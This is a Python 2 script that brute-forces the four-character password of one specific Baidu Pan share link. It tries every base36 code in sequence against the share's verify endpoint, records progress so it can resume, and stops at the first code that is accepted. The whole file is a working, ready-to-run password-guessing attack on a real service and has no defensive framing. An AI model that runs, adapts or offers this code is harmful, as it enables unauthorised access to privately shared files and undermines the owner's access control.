# -*- coding=UTF-8 -*-

import requests
import json
import sys

def base36encode(number, alphabet='0123456789abcdefghijklmnopqrstuvwxyz'):
    """Converts an integer to a base36 string."""
    if not isinstance(number, (int, long)):
        raise TypeError('number must be an integer')

    base36 = ''
    sign = ''

    if number < 0:
        sign = '-'
        number = -number

    if 0 <= number < len(alphabet):
        return sign + alphabet[number]

    while number != 0:
        number, i = divmod(number, len(alphabet))
        base36 = alphabet[i] + base36

    return sign + base36

def base36decode(number):
    return int(number, 36)

def pad(number):
    return (4 - len(number)) * '0' + number

url = 'http://pan.baidu.com/share/verify?shareid=110403693&uk=3544613589'
step = 100
log_file = '1.txt'

start_index = 0
with open(log_file, 'r') as f:
    raw_str = f.read().strip()
    if len(raw_str) > 0:
        start_index = int(raw_str)

for i in xrange(start_index, 1679616):
    if i % step == 0:
        print '%i/%i\n' % (i, 1679616)
        with open(log_file, 'w') as f:
            f.write(str(i))

    pw = pad(base36encode(i))
    payload = {'pwd': pw}
    try:
        r = requests.post(url, data=payload, timeout=10)
    except Exception as e:
        print e
        continue
    try:
        js = json.loads(r.text)
        print "%i\t\t\t%s\t%s" % (i, pw, js['errno'])
        sys.stdout.flush()
        if js['errno'] == 0:
            print 'Success: %i\t\t\t%s\t%s' % (i, pw, r.text)
            break
    except Exception as e:
        print e
        print "Error2: %i\t\t\t%s\t%s" % (i, pw, r.text)
        continue